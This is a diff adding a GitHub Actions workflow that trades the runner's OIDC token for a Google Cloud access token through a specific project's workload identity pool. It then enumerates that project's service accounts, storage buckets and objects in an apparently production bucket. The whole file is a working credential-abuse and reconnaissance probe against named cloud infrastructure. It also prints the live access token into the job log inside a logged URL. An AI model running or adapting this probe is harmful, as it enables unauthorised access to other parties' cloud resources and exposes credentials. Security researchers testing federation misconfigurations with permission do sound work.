@@ -1,0 +1,34 @@
+name: wif-probe-sts-scoped
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sts-and-api-probes
+        run: |
+          set -u
+          PROV="projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github"
+          AUD="//iam.googleapis.com/$PROV"
+          OIDC_RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+          JWT=$(printf '%s' "$OIDC_RESP" | jq -r .value)
+          echo "oidc_len=${#JWT}"
+          STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"audience\":\"$AUD\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$JWT\",\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}")
+          echo "sts_resp=$(printf '%s' "$STS" | sed -E 's/(access_token)\":\"[^\"]+\"/\1\":\"REDACTED\"/; s/(id_token)\":\"[^\"]+\"/\1\":\"REDACTED\"/')"
+          AT=$(printf '%s' "$STS" | jq -r '.access_token // empty')
+          echo "access_token_len=${#AT}"
+          if [ -z "$AT" ]; then exit 0; fi
+          for u in \
+            "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$AT" \
+            "https://cloudresourcemanager.googleapis.com/v1/projects" \
+            "https://iam.googleapis.com/v1/projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github" \
+            "https://iam.googleapis.com/v1/projects/305452601764/serviceAccounts" \
+            "https://storage.googleapis.com/storage/v1/b?project=305452601764" \
+            "https://storage.googleapis.com/storage/v1/b/oss-exit-gate-prod-projects-bucket/o?maxResults=5" ; do
+            echo "=== $u"
+            curl -sS -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "$u" | head -c 1200
+            echo
+          done
